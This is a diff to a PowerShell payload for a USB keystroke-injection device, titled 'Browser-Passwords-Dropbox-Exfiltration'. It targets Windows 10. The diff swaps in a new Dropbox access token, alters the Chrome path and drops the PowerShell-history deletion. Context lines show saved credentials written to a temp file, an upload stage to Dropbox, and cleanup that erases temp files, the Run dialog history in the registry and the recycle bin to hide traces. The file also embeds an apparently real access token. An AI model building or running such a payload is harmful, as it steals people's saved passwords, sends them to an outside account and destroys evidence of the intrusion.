@@ -1,14 +1,4 @@
-#########################################################################################################
-#                                                               |                                       #
-# Title        : Browser-Passwords-Dropbox-Exfiltration         |   ____ _____   ______                 #
-# Author       : DIYS.py                                        |  |  _ \_ _\ \ / / ___|  _ __  _   _   #
-# Version      : 1.0                                            |  | | | | | \ V /\___ \ | '_ \| | | |  #
-# Category     : Credentials, Exfiltration                      |  | |_| | |  | |  ___) || |_) | |_| |  #
-# Target       : Windows 10                                     |  |____/___| |_| |____(_) .__/ \__, |  #
-# Mode         : HID                                            |                        |_|    |___/   #
-# Props        : I am Jakoby, NULLSESSION0X                     |                                       #
-#                                                               |                                       # 
-#########################################################################################################
+
 
 <#
 .SYNOPSIS
@@ -20,7 +10,7 @@
 	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 #>
 
-$DropBoxAccessToken = "sl.BXrhr5_5_JjYd5z5o5Igq_tApyvxBiOJvYbiEw6rJUtR403S43HzbQ6zmNLWunbcOwPezEI9RZp3tr3J-KLrrv16IYU3H45ADEA9kT3WqUMdi5KasIOfbrhHHVokCDUN2dXdtJc"
+$DropBoxAccessToken = "sl.BXrAQczJgUChuKNCn7RdlMxx2z9ft2BvA2fe1O65HVTbnarcAsSCLN4YSMSoqoYVKhosSStqm-m0JBwtV-5uAjWs9M92_0PAzanE6S8o4letOfaBzGyrFWNkvFXa8xWt9tlbKJ7HtDzm"
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
@@ -54,7 +44,7 @@ echo $l >> $env:TMP\$FileName
 
 #Start Chrome again
 
-$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
+$pathToChrome = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
 Start-Process -FilePath $pathToChrome
 
 #Stage 2 Upload them to Dropbox
@@ -90,12 +80,10 @@ rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 exit
+
